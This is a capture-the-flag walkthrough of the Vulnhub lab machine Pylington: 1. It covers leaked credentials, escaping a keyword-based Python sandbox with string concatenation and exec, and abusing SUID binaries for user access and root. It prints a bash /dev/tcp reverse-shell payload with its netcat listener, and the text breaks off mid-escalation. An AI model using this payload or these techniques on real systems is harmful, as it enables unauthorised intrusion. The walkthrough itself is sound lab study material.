## PYLINGTON: 1
This is [PYLINGTON: 1](https://www.vulnhub.com/entry/pylington-1,684/) from Vulnhub. It doesn't have a rating but I'm going to say it was easy.

## Ports
SSH and HTTP, and running on Arch Linux. That's interesting, isn't it? No? Whatever.

## Web
We have an online python interpreter but in order to use it we are supposed to register; but registration has been disabled. *robots.txt* points us to */zbir7mn240soxhicso2z*, which contains some credentials, and we can use that to login. Once logged in, we get a page where we can enter a python program, give it input and see the output. 

We are also told:

>This online IDE is protected with NoImportOSâ„¢, an unescapableâ„¢ sandbox. NoImportOSâ„¢ is secure because of its simplicity; it's only 9 lines of code (available here)

What does that code look like?

{% highlight python %}
def check_if_safe(code: str) -> bool:
    if 'import' in code: # import is too dangerous
        return False
    elif 'os' in code: # os is too dangerous
        return False
    elif 'open' in code: # opening files is also too dangerous
        return False
    else:
        return True
{% endhighlight %}

So it's literally looking for the strings 'os', 'import' and 'open'. Should be easy, yes?

Here's my reverse shell - there are other ways of doing this, but this was mine:

{% highlight python %}
a = "im"
b = "port "
c = "o"
d = "s;"
e = "s"
f = ".system"
g = "('bash -i >& /dev/tcp/192.168.1.204/1234 0>&1')"
exec(a+b+c+d+c+e+f+g)
{% endhighlight %}

Does it work? Of course!

{% highlight shell %}
â”Œâ”€â”€(rootðŸ’€kali)-[/opt/vulnhub/pylington]
â””â”€# nc -nvlp 1234                                                                                                                                           1 â¨¯

bash: no job control in this shell
[http@archlinux /]$
{% endhighlight %}

## PY and root
Getting to user (py) was very simple with an SUID binary:

{% highlight shell %}
[http@archlinux py]$ ./typing
./typing
Let's play a game! If you can type the sentence below, then I'll tell you my password.

the quick brown fox jumps over the lazy dog
the quick brown fox jumps over the lazy dog
54ezhCGaJV
[http@archlinux py]$ su py
su py
Password: 54ezhCGaJV
python3 -c 'import pty;pty.spawn("/bin/bash");'
[py@archlinux ~]$
{% endhighlight %}

Well, that was easy. The source code for the *typing* binary was provided too. 

Now, for root we have another SUID binary:

{% highlight shell %}
[py@archlinux secret_stuff]$ ls -lash
ls -lash

[py@archlinux secret_stuff]$ cat backup.cc
cat backup.cc
#include <iostream>
#include <string>
#include <fstream>

int main(){
    std::cout<<"Enter a line of text to back up: ";
    std::string line;
    std::getline(std::cin,line);
    std::string path;
    std::cout<<"Enter a file to append the text to (must be inside the /srv/backups directory): ";
    std::getline(std::cin,path);

    if(!path.starts_with("/srv/backups/")){
        std::cout<<"The file must be inside the /srv/backups directory!\n";
    }
    else{
        std::ofstream backup_file(path,std::ios_base::app);
        backup_file<<line<<'\n';
    }

    return 0;
}
[py@archlinux secret_stuff]$
{% endhighlight %}

What can we do with this? The trick is that the output directory has to *start with* */srv/backups*; but it doesn't have to end there.

{% highlight shell %}
[py@archlinux secret_stuff]$ ./backup
./backup
